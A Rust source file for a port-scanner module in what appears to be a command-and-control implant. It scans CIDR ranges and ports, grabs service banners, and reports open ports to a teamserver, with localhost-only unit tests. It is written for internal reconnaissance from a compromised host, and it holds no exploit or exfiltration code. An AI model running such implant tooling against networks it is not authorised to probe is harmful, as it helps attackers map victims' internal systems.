//! Implant-side asynchronous TCP connect scanner.
//!
//! Supports CIDR ranges, host lists and port expressions (`22,80,443`,
//! `1-1024`, `top100`). All probes run from the agent's network position,
//! which makes it possible to enumerate networks the teamserver cannot reach.

use crate::TaskOutcome;
use anyhow::{anyhow, Result};
use serde::Serialize;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncReadExt;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;

/// Ports most likely to expose a service, used when `ports` is omitted.
pub const DEFAULT_PORTS: &[u16] = &[
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306,
    3389, 5432, 5900, 5985, 6379, 8080, 8443, 9000, 9090, 27017,
];

const MAX_HOSTS: usize = 4096;
const MAX_PORTS: usize = 8192;
const MAX_CONCURRENCY: usize = 512;
const BANNER_BYTES: usize = 256;

#[derive(Debug, Clone, Serialize)]
pub struct ScanHit {
    pub host: String,
    pub port: u16,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub banner: Option<String>,
}

#[derive(Debug, Clone)]
pub struct ScanReport {
    pub hosts_scanned: usize,
    pub ports_scanned: usize,
    pub hits: Vec<ScanHit>,
    pub duration_ms: u64,
}

/// Expands a target expression into individual IP addresses.
///
/// Accepts a single IP, CIDR (`10.0.0.0/24`), a hostname (resolved via the
/// system resolver) or a comma-separated mixture. The total host count is
/// capped so a mistyped range cannot flood the network.
pub fn parse_targets(raw: &str) -> Result<Vec<IpAddr>> {
    let mut hosts = Vec::new();
    for part in raw.split(',').map(str::trim).filter(|p| !p.is_empty()) {
        if let Some((addr, prefix)) = part.split_once('/') {
            let base: IpAddr = addr
                .parse()
                .map_err(|_| anyhow!("invalid CIDR base address: {addr}"))?;
            let prefix: u8 = prefix
                .parse()
                .map_err(|_| anyhow!("invalid CIDR prefix: {prefix}"))?;
            let range = cidr_hosts(base, prefix)?;
            hosts.extend(range);
        } else if let Ok(addr) = part.parse::<IpAddr>() {
            hosts.push(addr);
        } else {
            // Fall back to DNS resolution for hostnames.
            let resolved = std::net::ToSocketAddrs::to_socket_addrs(&(part, 0))
                .map_err(|_| anyhow!("unresolved target: {part}"))?;
            let mut any = false;
            for socket in resolved {
                hosts.push(socket.ip());
                any = true;
            }
            if !any {
                return Err(anyhow!("unresolved target: {part}"));
            }
        }
        if hosts.len() > MAX_HOSTS {
            return Err(anyhow!("target list exceeds {MAX_HOSTS} hosts"));
        }
    }
    hosts.sort();
    hosts.dedup();
    if hosts.is_empty() {
        return Err(anyhow!("no targets provided"));
    }
    Ok(hosts)
}

fn cidr_hosts(base: IpAddr, prefix: u8) -> Result<Vec<IpAddr>> {
    match base {
        IpAddr::V4(v4) => {
            if prefix > 32 {
                return Err(anyhow!("IPv4 prefix must be <= 32"));
            }
            let mask = if prefix == 0 {
                0u32
            } else {
                u32::MAX << (32 - prefix)
            };
            let network = u32::from(v4) & mask;
            let broadcast = network | !mask;
            let host_count = (broadcast - network + 1) as usize;
            if host_count > MAX_HOSTS {
                return Err(anyhow!(
                    "CIDR expands to {host_count} hosts (max {MAX_HOSTS})"
                ));
            }
            let mut out = Vec::with_capacity(host_count);
            let mut current = network;
            while current <= broadcast {
                out.push(IpAddr::V4(Ipv4Addr::from(current)));
                current += 1;
            }
            Ok(out)
        }
        IpAddr::V6(v6) => {
            if prefix > 128 {
                return Err(anyhow!("IPv6 prefix must be <= 128"));
            }
            let mask = if prefix == 0 {
                0u128
            } else {
                u128::MAX << (128 - prefix)
            };
            let network = u128::from(v6) & mask;
            let broadcast = network | !mask;
            let host_count = (broadcast - network + 1) as usize;
            if host_count > MAX_HOSTS {
                return Err(anyhow!(
                    "CIDR expands to {host_count} hosts (max {MAX_HOSTS})"
                ));
            }
            let mut out = Vec::with_capacity(host_count);
            let mut current = network;
            while current <= broadcast {
                out.push(IpAddr::V6(Ipv6Addr::from(current)));
                current += 1;
            }
            Ok(out)
        }
    }
}

/// Expands a port expression into individual ports.
///
/// Accepts comma-separated ports and ranges (`22,80,8000-8100`) plus the
/// presets `top100`/`default` (the built-in common list) and `all`.
pub fn parse_ports(raw: &str) -> Result<Vec<u16>> {
    let raw = raw.trim();
    if raw.is_empty() || raw.eq_ignore_ascii_case("default") || raw.eq_ignore_ascii_case("top100") {
        return Ok(DEFAULT_PORTS.to_vec());
    }
    if raw.eq_ignore_ascii_case("all") {
        return Ok((1..=65535).collect());
    }

    let mut ports = Vec::new();
    for part in raw.split(',').map(str::trim).filter(|p| !p.is_empty()) {
        if let Some((start, end)) = part.split_once('-') {
            let start: u16 = start
                .parse()
                .map_err(|_| anyhow!("invalid port range start: {start}"))?;
            let end: u16 = end
                .parse()
                .map_err(|_| anyhow!("invalid port range end: {end}"))?;
            if start == 0 || end == 0 || start > end {
                return Err(anyhow!("invalid port range: {part}"));
            }
            ports.extend(start..=end);
        } else {
            let port: u16 = part.parse().map_err(|_| anyhow!("invalid port: {part}"))?;
            if port == 0 {
                return Err(anyhow!("port 0 is not valid"));
            }
            ports.push(port);
        }
        if ports.len() > MAX_PORTS {
            return Err(anyhow!("port list exceeds {MAX_PORTS} entries"));
        }
    }
    ports.sort_unstable();
    ports.dedup();
    if ports.is_empty() {
        return Err(anyhow!("no ports provided"));
    }
    Ok(ports)
}

/// Runs a connect scan with a bounded number of concurrent probes.
pub async fn scan(
    targets: &[IpAddr],
    ports: &[u16],
    concurrency: usize,
    timeout: Duration,
    grab_banner: bool,
    cancel: Option<Arc<AtomicBool>>,
) -> ScanReport {
    let concurrency = concurrency.clamp(1, MAX_CONCURRENCY);
    let started = std::time::Instant::now();
    let semaphore = std::sync::Arc::new(Semaphore::new(concurrency));
    let mut tasks = Vec::new();

    for host in targets {
        for port in ports {
            let semaphore = semaphore.clone();
            let host = *host;
            let port = *port;
            tasks.push(tokio::spawn(async move {
                let _permit = semaphore.acquire_owned().await.ok()?;
                let address = SocketAddr::new(host, port);
                match tokio::time::timeout(timeout, TcpStream::connect(address)).await {
                    Ok(Ok(mut stream)) => {
                        let banner = if grab_banner {
                            grab(&mut stream, timeout).await
                        } else {
                            None
                        };
                        Some(ScanHit {
                            host: host.to_string(),
                            port,
                            banner,
                        })
                    }
                    _ => None,
                }
            }));
        }
    }

    let mut hits = Vec::new();
    for task in tasks {
        if let Some(flag) = &cancel {
            if flag.load(Ordering::SeqCst) {
                task.abort();
                continue;
            }
        }
        if let Ok(Some(hit)) = task.await {
            hits.push(hit);
        }
    }
    hits.sort_by(|a, b| a.host.cmp(&b.host).then_with(|| a.port.cmp(&b.port)));

    ScanReport {
        hosts_scanned: targets.len(),
        ports_scanned: ports.len(),
        hits,
        duration_ms: started.elapsed().as_millis() as u64,
    }
}

async fn grab(stream: &mut TcpStream, timeout: Duration) -> Option<String> {
    let mut buffer = vec![0u8; BANNER_BYTES];
    match tokio::time::timeout(timeout, stream.read(&mut buffer)).await {
        Ok(Ok(n)) if n > 0 => {
            let text: String = buffer[..n]
                .iter()
                .map(|byte| {
                    if byte.is_ascii_graphic() || *byte == b' ' {
                        *byte as char
                    } else {
                        '.'
                    }
                })
                .collect();
            Some(text.trim().to_string())
        }
        _ => None,
    }
}

/// Task-surface wrapper for the `portscan` task.
pub async fn task_portscan(task: &crate::AgentTask, args: &serde_json::Value) -> TaskOutcome {
    let target = match args.get("target").and_then(|value| value.as_str()) {
        Some(target) if !target.trim().is_empty() => target.trim().to_string(),
        _ => return TaskOutcome::fail("portscan requires a target"),
    };
    let ports_raw = args
        .get("ports")
        .and_then(|value| value.as_str())
        .unwrap_or("default");
    let timeout_ms = args
        .get("timeout_ms")
        .and_then(|value| value.as_u64())
        .unwrap_or(800)
        .clamp(50, 10_000);
    let concurrency = args
        .get("concurrency")
        .and_then(|value| value.as_u64())
        .unwrap_or(128) as usize;
    let banner = args
        .get("banner")
        .and_then(|value| value.as_bool())
        .unwrap_or(false);

    let targets = match parse_targets(&target) {
        Ok(targets) => targets,
        Err(err) => return TaskOutcome::fail(err.to_string()),
    };
    let ports = match parse_ports(ports_raw) {
        Ok(ports) => ports,
        Err(err) => return TaskOutcome::fail(err.to_string()),
    };

    let cancel = crate::jobs::cancel_flag(&task.task_id);
    crate::jobs::wait_resume(crate::jobs::pause_flag(&task.task_id)).await;
    let report = scan(
        &targets,
        &ports,
        concurrency,
        Duration::from_millis(timeout_ms),
        banner,
        cancel,
    )
    .await;

    match serde_json::to_vec(&serde_json::json!({
        "hosts_scanned": report.hosts_scanned,
        "ports_scanned": report.ports_scanned,
        "duration_ms": report.duration_ms,
        "open": report.hits,
    })) {
        Ok(bytes) => TaskOutcome {
            exit_code: 0,
            stdout: bytes,
            stderr: String::new(),
        },
        Err(err) => TaskOutcome::fail(format!("failed to encode scan report: {err}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_single_and_list_targets() {
        let hosts = parse_targets("127.0.0.1, 10.0.0.1").expect("targets");
        assert_eq!(
            hosts,
            vec![
                IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
            ]
        );
    }

    #[test]
    fn parses_cidr() {
        let hosts = parse_targets("192.168.1.0/30").expect("targets");
        assert_eq!(hosts.len(), 4);
        assert!(hosts.contains(&IpAddr::V4(Ipv4Addr::new(192, 168, 1, 3))));
    }

    #[test]
    fn rejects_oversized_cidr() {
        assert!(parse_targets("10.0.0.0/8").is_err());
        assert!(parse_targets("10.0.0.0/33").is_err());
        assert!(parse_targets("").is_err());
    }

    #[test]
    fn parses_ports() {
        assert_eq!(parse_ports("22,80,443").expect("ports"), vec![22, 80, 443]);
        assert_eq!(
            parse_ports("8000-8002").expect("ports"),
            vec![8000, 8001, 8002]
        );
        assert_eq!(
            parse_ports("default").expect("ports"),
            DEFAULT_PORTS.to_vec()
        );
    }

    #[test]
    fn rejects_bad_ports() {
        assert!(parse_ports("0").is_err());
        assert!(parse_ports("abc").is_err());
        assert!(parse_ports("100-50").is_err());
    }

    #[tokio::test]
    async fn scans_open_port() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind");
        let port = listener.local_addr().expect("addr").port();
        tokio::spawn(async move {
            loop {
                let _ = listener.accept().await;
            }
        });

        let targets = vec![IpAddr::V4(Ipv4Addr::LOCALHOST)];
        let ports = vec![port];
        let report = scan(&targets, &ports, 4, Duration::from_millis(500), false, None).await;
        assert_eq!(report.hits.len(), 1);
        assert_eq!(report.hits[0].port, port);
    }

    #[tokio::test]
    async fn closed_port_is_not_reported() {
        // Reserve an ephemeral port and close it by dropping the listener.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind");
        let port = listener.local_addr().expect("addr").port();
        drop(listener);

        let targets = vec![IpAddr::V4(Ipv4Addr::LOCALHOST)];
        let ports = vec![port];
        let report = scan(&targets, &ports, 4, Duration::from_millis(300), false, None).await;
        assert!(report.hits.is_empty());
    }

    #[tokio::test]
    async fn task_reports_open_ports() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind");
        let port = listener.local_addr().expect("addr").port();
        tokio::spawn(async move {
            loop {
                let _ = listener.accept().await;
            }
        });

        let args = serde_json::json!({
            "target": "127.0.0.1",
            "ports": port.to_string(),
            "timeout_ms": 500,
        });
        let task = shikra_proto::v1::AgentTask {
            task_id: "scan-test".into(),
            kind: "portscan".into(),
            args: Vec::new(),
            payload: Vec::new(),
        };
        let outcome = task_portscan(&task, &args).await;
        assert_eq!(outcome.exit_code, 0, "{}", outcome.stderr);
        let report: serde_json::Value = serde_json::from_slice(&outcome.stdout).expect("json");
        assert_eq!(report["open"][0]["port"], port);
    }
}
